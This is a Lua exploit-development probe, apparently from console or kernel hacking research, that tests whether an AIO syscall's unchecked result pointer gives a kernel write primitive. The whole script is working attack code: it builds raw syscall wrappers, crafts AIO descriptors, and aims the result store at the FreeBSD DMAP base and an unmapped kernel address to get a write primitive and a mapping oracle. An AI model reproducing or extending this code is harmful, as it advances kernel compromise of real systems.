-- CRASH_CLASS: HIGH
-- PROBE 745a: the aio result pointer is a raw kernel write -- does it reach kernel VAs?
--
-- 744b: a descriptor buffer at 0x1000 gets EFAULT (0x8002000E), but a result
-- pointer at 0x1000 kills the process. So the buffer is validated and the result
-- pointer is a raw store. Whether that store can reach kernel virtual addresses
-- decides if it is a kernel write primitive.
--
-- A: result = 0xfffffe0000000000 (FreeBSD DMAP base, physical 0). Surviving means
--    the store reached kernel space without a handled fault.
-- B: result = 0xffffffffff000000 (canonical, almost certainly unmapped). Dying
--    means a miss is fatal, which also makes a mapped/unmapped oracle out of A.

print("=== PROBE 745a: AIO RESULT INTO KERNEL SPACE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local sc_write = mk(4); local sc_pair = mk(135)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(U(ts), U(0)) end) end
print("[A] pid="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))

local fds = to_num(memory.alloc(64)); wq(fds, uint64(0))
print("[A] socketpair -> "..tostring(call(sc_pair, 1, 1, 0, fds, 0, 0)))
local fd = rd(fds); local peer = rd(fds+4)
print(string.format("[A] fd=%d peer=%d", fd, peer))

local D = to_num(memory.alloc(0x4000)); local buf = to_num(memory.alloc(0x4000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400)); local ds = to_num(memory.alloc(0x400))
zero(D,0x4000); zero(buf,0x4000); zero(st,0x400); zero(ds,0x400)
local w = to_num(memory.alloc(64))
for k=0,3 do wd(w+k*4, 0x49494949) end

local function attempt(tag, resv)
    zero(D,0x100)
    wq(D+0x00, uint64(0)); wq(D+0x08, uint64(16))
    wq(D+0x10, uint64(buf)); wq(D+0x18, uint64(resv))
    wd(D+0x20, fd); wd(D+0x24, 0)
    wd(ids, 0)
    print(string.format("%s create ret=%s id=%08X", tag, tostring(call(mk(669), 1+0x1000, D, 1, 1, ids, 0)), rd(ids)))
    local id = rd(ids)
    if id == 0 or id == -1 then return false end
    sleep_ms(20)
    wd(ids, id); call(mk(664), ids, 1, st, 0, 0, 0)
    print(string.format("%s state=%08X", tag, rd(st)))
    print(string.format("%s write -> %s", tag, tostring(call(sc_write, peer, w, 16, 0, 0, 0))))
    sleep_ms(80)
    wd(ids, id); call(mk(664), ids, 1, st, 0, 0, 0)
    print(string.format("%s state after=%08X", tag, rd(st)))
    wd(ids, id); call(mk(662), ids, 1, ds, 0, 0, 0)
    print(string.format("%s delete status=%08X", tag, rd(ds)))
    print(string.format("%s health=%s", tag, tostring(call(syscall.pipe, 20, 0,0,0,0,0,0))))
    return true
end

attempt("[A] res=DMAP base", 0xfffffe0000000000)
print("[A] survived")
attempt("[B] res=unmapped kernel", 0xffffffffff000000)
print("[B] survived")
print("=== 745a DONE ===")
